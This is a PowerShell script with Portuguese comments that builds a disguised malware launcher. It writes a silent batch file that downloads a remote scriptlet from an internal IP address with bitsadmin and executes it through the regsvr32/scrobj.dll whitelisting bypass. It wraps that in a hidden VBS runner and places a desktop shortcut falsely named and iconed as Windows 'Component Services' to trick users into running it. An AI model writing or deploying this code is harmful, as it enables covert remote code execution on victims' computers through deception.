# Caminho para a área de trabalho
$atalhoPath = "$env:USERPROFILE\Desktop"

# Criar um arquivo BAT direto (sem codificação)
$batPath = "$env:TEMP\config.bat"
@"
@echo off
rem Executar silenciosamente
bitsadmin /transfer myDownloadJob /download /priority high http://192.168.29.11/teste.sct "%TEMP%\data.tmp" > nul
regsvr32 /s /u /i:"%TEMP%\data.tmp" scrobj.dll
exit
"@ | Out-File -FilePath $batPath -Encoding ASCII

# Criar um script VBS para rodar o BAT silenciosamente
$vbsPath = "$env:TEMP\config.vbs"
$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c ""%TEMP%\config.bat""", 0, False
'@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII

# Criar atalho diretamente para o VBS (em vez do BAT)
$WshShell = New-Object -ComObject WScript.Shell
$atalho = $WshShell.CreateShortcut("$atalhoPath\Component Services.lnk")
$atalho.TargetPath = "wscript.exe"
$atalho.Arguments = "`"$vbsPath`""
$atalho.Description = "Component Services"
$atalho.IconLocation = "$env:SystemRoot\System32\mmcndmgr.dll,0"
$atalho.WindowStyle = 7
$atalho.Save()

# Exibir confirmação
Write-Host "Atalho criado com sucesso em: $atalhoPath\Component Services.lnk" -ForegroundColor Green
